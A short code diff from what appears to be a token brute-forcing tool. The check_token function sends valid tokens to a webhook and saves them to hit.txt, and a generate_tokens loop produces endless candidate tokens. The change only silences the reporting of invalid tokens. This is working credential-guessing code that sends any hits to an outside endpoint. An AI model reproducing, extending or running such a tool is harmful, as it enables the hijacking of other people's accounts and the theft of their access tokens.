@@ -23,8 +23,8 @@ def check_token(token):
         send_to_webhook(Fore.GREEN + '[+] VALID' + ' ' + token)
         with open('hit.txt', "a+") as f:
             f.write(f'{token}\n')
-    else:
-        send_to_webhook(Fore.RED + '[-] INVALID' + ' ' + token)
+#    else:
+ #       send_to_webhook(Fore.RED + '[-] INVALID' + ' ' + token)
 
 def generate_tokens():
     while True:
